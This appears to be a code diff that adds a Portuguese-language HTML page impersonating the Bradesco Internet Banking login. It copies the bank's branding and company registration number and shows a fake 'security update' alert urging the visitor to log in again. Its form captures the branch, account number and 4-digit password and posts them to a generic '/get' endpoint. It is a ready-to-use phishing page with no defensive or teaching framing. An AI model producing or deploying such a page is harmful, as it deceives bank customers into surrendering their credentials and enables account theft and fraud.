@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bradesco - Internet Banking</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #cc092f 0%, #8c0621 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo h1 {
+            color: #cc092f;
+            font-size: 32px;
+            font-weight: bold;
+        }
+        .logo p {
+            color: #666;
+            font-size: 14px;
+        }
+        .alert {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #856404;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #cc092f;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #cc092f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #a00725;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>Bradesco</h1>
+            <p>Internet Banking</p>
+        </div>
+        <div class="alert">
+            ⚠️ Para sua segurança, faça login novamente devido à atualização de segurança.
+        </div>
+        <form action="/get" method="POST">
+            <div class="form-group">
+                <label>Agência (sem dígito)</label>
+                <input type="text" name="agencia" placeholder="0000" maxlength="4" required>
+            </div>
+            <div class="form-group">
+                <label>Conta Corrente (com dígito)</label>
+                <input type="text" name="conta" placeholder="0000000-0" required>
+            </div>
+            <div class="form-group">
+                <label>Senha de 4 dígitos</label>
+                <input type="password" name="senha" placeholder="••••" maxlength="4" required>
+            </div>
+            <button type="submit">Acessar</button>
+        </form>
+        <div class="footer">
+            Bradesco S.A. - CNPJ 60.746.948/0001-12
+        </div>
+    </div>
+</body>
+</html>
